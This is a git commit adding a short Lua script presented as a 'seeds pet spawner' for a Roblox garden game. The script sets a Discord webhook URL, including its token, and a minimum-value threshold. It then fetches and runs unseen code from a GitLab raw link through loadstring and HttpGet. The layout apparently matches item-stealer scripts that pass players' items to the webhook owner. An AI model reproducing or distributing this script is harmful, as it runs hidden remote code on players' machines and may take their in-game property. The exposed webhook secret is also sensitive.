c591127f3dda775b75911c95e55abe46a8414753
k0sowa <kaitoyoshiro5@gmail.com>
2025-06-23 19:33:27 +0800

    Create Dark-Spawner-seeds-pet

---
+++ Dark-Spawner-seeds-petGaG.lua
@@ -0,0 +1,6 @@
+Username = "k0sowa"
+Webhook =
+"https://discord.com/api/webhooks/1386669178060279841/YITy9XLfRSjq73SJ2r2xz90mggWx3VKUH8AWzuT6mKRA7fMxEjZniLdMJYPYRhKDlmkD"
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
